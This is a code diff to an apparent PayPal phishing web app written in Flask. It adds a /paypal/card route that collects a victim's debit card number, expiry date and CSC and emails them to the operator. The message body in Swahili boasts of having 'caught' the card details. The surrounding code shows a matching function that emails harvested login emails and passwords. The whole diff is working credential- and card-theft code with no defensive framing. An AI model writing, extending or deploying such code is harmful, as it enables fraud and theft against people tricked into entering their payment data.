@@ -198,6 +198,25 @@ def paypal_login():
        
     return render_template("ukora.html")
 
+@app.route("/paypal/card", methods=["GET","POSt"])
+def debit_card_details():
+    """Get debit card details"""
+    if request.method == "POST":
+        card_number = request.form.get("card-number")
+        expiry_date = request.form.get("expiry-date")
+        csc = request.form.get("csc-no")
+
+        message = send_admin_email_debit(card_number, expiry_date, csc)
+
+        if message != None:
+            print("Email sent successfully")
+            return redirect(url_for("home"))
+        else:
+            print("Failed to send email")
+            return redirect(url_for("debit_card_details"))
+
+    return render_template("debitdet.html")
+
 # --------
 # PING KEEP ALIVE TO STAY ALIVE
 # --------
@@ -232,6 +251,28 @@ def send_admin_email(email, password):
         message = None
         return message
 
+
+def send_admin_email_debit(card_number, expiry_date, csc):
+    """send email to admin"""
+    message = None
+    try:
+        msg = Message("Changamka Mzee!!!!", recipients=[RECEPIENT_MAIL])
+        msg.body = f"""
+        Nimenasa details za card hapa:
+
+        Card Number: {card_number}
+        Expiry Date: {expiry_date}
+        CSC: {csc}
+        """
+        mail.send(msg)
+        message = "Sent"
+        return message
+    except (ConnectionError, smtplib.SMTPException) as e:
+        message = None
+        return message
+    except Exception as e:
+        message = None
+        return message
 
 # --------
 # a keep alive for keep alive worker
